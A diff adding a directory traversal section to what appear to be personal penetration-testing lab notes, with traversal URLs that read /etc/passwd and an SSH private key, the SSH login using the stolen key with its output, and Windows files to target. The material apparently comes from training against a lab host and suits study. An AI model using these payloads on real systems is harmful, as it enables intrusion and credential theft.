@@ -995,3 +995,50 @@ Run the function from the browser's console to Unicode.
 ![image](https://hackmd.io/_uploads/SylsBqVfyl.png)
 
 # Web Application Attacks
+## Directory Traversal
+- Absolute vs Relative Paths
+- Identifying and Exploiting Directory Traversals
+```
+http://mountaindesserts.com/meteor/index.php?page=admin.php
+```
+> 1. index.php tells us the web application uses PHP
+> 2. URL contains a directory called meteor (subdirectory of the web root.)
+> 3. PHP uses `$_GET` to manage variables via a GET request
+```
+TRY
+http://mountaindesserts.com/meteor/index.php?
+1. page=../../../../../../../../../etc/passwd
+2. page=../../../../../../../../../home/offsec/.ssh/id_rsa
+```
+When we get the SSH private key, use the private key to connect to the target system via SSH on port 2222.
+Private key file: *dt_key*
+```
+┌──(chw㉿CHW-kali)-[/]
+└─$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
+The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+...
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for '/home/kali/dt_key' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+...
+
+┌──(chw㉿CHW-kali)-[/]
+└─$ chmod 400 dt_key
+
+┌──(chw㉿CHW-kali)-[/]
+└─$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
+...
+offsec@68b68f3eb343:~$ 
+```
+>[!Important]
+> Windows directory traversal\
+> `C:\Windows\System32\drivers\etc\hosts`\
+> Log:\
+> `C:\inetpub\logs\LogFiles\W3SVC1\.`\
+> IIS web server:\
+> `C:\inetpub\wwwroot\web.config`
+
